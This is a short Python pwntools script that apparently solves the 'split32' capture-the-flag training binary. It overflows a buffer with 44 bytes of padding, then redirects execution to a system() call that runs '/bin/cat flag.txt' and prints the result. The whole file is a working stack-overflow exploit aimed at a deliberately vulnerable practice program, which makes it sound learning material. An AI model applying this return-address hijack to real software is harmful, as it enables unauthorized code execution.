from pwn import *

elf = ELF("./split32")
p = process(elf.path)

offset = 44
cat_flag_str = 0x804a030  # "/bin/cat flag.txt"
call_system = 0x0804861a
payload = cyclic(offset) + p32(call_system) + p32(cat_flag_str)

p.sendline(payload)
p.recvuntil("Thank you!\n")
print(p.recv().decode())
